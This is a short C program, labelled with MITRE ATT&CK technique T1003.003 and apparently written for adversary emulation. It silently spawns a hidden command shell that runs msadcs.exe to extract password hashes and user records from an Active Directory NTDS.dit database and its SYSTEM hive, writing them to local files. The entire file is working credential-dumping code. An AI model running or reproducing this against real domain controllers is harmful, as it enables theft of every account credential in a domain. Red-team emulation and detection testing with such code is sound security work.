// Link      = https://attack.mitre.org/techniques/T1003/003/
// Technique = OS Credential Dumping: NTDS
// ID        = T1003.003
// Tactics   = Credential Access

#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)"cmd /c " to_run, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

STARTUPINFOA si;
PROCESS_INFORMATION pi;

int main() {
    RUN("msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p a.txt --users-csv a.csv");

    return 0;
}
